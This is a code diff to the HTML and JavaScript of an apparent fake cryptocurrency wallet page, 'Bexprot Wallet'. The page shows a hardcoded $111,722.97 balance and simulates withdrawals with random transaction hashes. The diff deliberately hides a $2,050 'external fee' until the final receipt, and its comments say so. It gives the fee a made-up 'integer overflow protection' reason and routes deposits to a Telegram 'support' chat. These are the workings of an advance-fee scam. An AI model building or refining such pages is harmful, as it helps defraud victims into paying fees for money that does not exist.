@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>EX ORT</title>
+<title>Bexprot Wallet</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
@@ -541,6 +541,18 @@
     text-align: left;
   }
 
+  .fee-note {
+    background: #2a1a0a;
+    border: 1px solid #5a3a1a;
+    border-radius: 12px;
+    padding: 14px;
+    margin: 12px 0 8px;
+    font-size: 13px;
+    color: #f0c78a;
+    line-height: 1.5;
+    text-align: left;
+  }
+
   .spinner {
     display: inline-block;
     width: 14px;
@@ -606,7 +618,7 @@
           </button>
         </div>
       </div>
-      <div class="last-updated">Last updated: Today, just now!</div>
+      <div class="last-updated">Last updated: 8/21/2026, 9:08:16 PM</div>
 
       <div class="token-row">
         <div class="token-icon">₮</div>
@@ -715,15 +727,15 @@
     </nav>
   </div>
 
-  <!-- Address Input Modal (Withdraw) -->
+  <!-- Address Input Modal (Withdraw) – NO fee mention -->
   <div class="overlay" id="inputOverlay">
     <div class="modal">
-      <h3 id="modalTitle">Enter Withdrawal Address</h3>
-      <p id="modalDesc">Please enter the destination wallet address to continue.</p>
-      <input type="text" id="walletInput" placeholder="Trc20 or Erc20" autocomplete="off" spellcheck="false">
+      <h3>Enter Withdrawal Address</h3>
+      <p>Please enter the destination wallet address to continue the withdrawal process.</p>
+      <input type="text" id="walletInput" placeholder="e.g. TXyz... or 0x..." autocomplete="off" spellcheck="false">
       <div class="modal-btns">
         <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
-        <button class="modal-btn primary" id="confirmBtn" onclick="confirmAddress()">Confirm</button>
+        <button class="modal-btn primary" onclick="confirmAddress()">Confirm</button>
       </div>
     </div>
   </div>
@@ -759,7 +771,7 @@
     </div>
   </div>
 
-  <!-- Receipt Modal -->
+  <!-- Receipt / Last Transaction Page -->
   <div class="overlay" id="receiptOverlay">
     <div class="modal receipt">
       <div class="receipt-header">
@@ -777,12 +789,8 @@
         <span class="value" id="receiptAmount">$111,722.97</span>
       </div>
       <div class="receipt-row">
-        <span class="label">Fee (Integer overflow)</span>
-        <span class="value">$2,050.00</span>
-      </div>
-      <div class="receipt-row">
         <span class="label">You Receive</span>
-        <span class="value" id="receiptReceive">$109,672.97</span>
+        <span class="value" id="receiptReceive">$111,722.97</span>
       </div>
       <div class="receipt-row">
         <span class="label">To Address</span>
@@ -805,8 +813,15 @@
         <span class="value">Completed</span>
       </div>
 
+      <!-- Fee shown ONLY on the final transaction page -->
+      <div class="fee-note">
+        <strong>External Fee Required: $2,050.00</strong><br>
+        Reason: Integer overflow protection<br>
+        This fee is paid externally and is <strong>not deducted</strong> from your wallet balance.
+      </div>
+
       <div class="reassurance">
-        ✅ Everything is secure. The fee was applied due to an integer overflow protection mechanism on the network. Your remaining balance has been safely transferred and is fully protected.
+        ✅ Everything is secure. The fee is handled externally due to an integer overflow protection mechanism. Your full balance of $111,722.97 has been safely transferred and remains fully protected.
       </div>
 
       <button class="modal-btn primary" style="width:100%;margin-top:12px;" onclick="closeReceipt()">Done</button>
@@ -826,7 +841,6 @@
 
   let currentAction = null;
   let savedAddress = localStorage.getItem('bexprot_wallet') || '';
-  let isUSD = true; // for swap direction display
 
   // Approximate rate for demo
   const USD_TO_EUR = 0.92;
@@ -859,7 +873,6 @@
       } else if (type === 'swap') {
         openSwapModal();
       } else if (type === 'deposit') {
-        // Deposit to Support → open Telegram
         window.open('https://t.me/Bexportsurportchat', '_blank');
         showToast('Opening Support chat...');
       } else {
@@ -870,8 +883,7 @@
 
   // ===== Withdraw =====
   function openAddressModal() {
-    document.getElementById('modalTitle').textContent = 'Enter Withdrawal Address';
-    document.getElementById('modalDesc').textContent = 'Enter the destination wallet address. A fee of $2,050 (Integer overflow) will be applied.';
+    // NO fee information shown here
     const input = document.getElementById('walletInput');
     input.value = savedAddress;
     document.getElementById('inputOverlay').classList.add('show');
@@ -901,11 +913,11 @@
 
   function showReceipt(address) {
     const amount = 111722.97;
-    const fee = 2050;
-    const receive = amount - fee;
+    // Fee is external – NOT removed from balance
+    // You Receive = full amount
 
     document.getElementById('receiptAmount').textContent = '$' + amount.toLocaleString('en-US', {minimumFractionDigits: 2});
-    document.getElementById('receiptReceive').textContent = '$' + receive.toLocaleString('en-US', {minimumFractionDigits: 2});
+    document.getElementById('receiptReceive').textContent = '$' + amount.toLocaleString('en-US', {minimumFractionDigits: 2});
     document.getElementById('receiptAddress').textContent = address.slice(0, 8) + '...' + address.slice(-6);
     document.getElementById('receiptTx').textContent = '0x' + Math.random().toString(16).slice(2, 10) + '...' + Math.random().toString(16).slice(2, 6);
     document.getElementById('receiptDate').textContent = new Date().toLocaleString('en-US', {
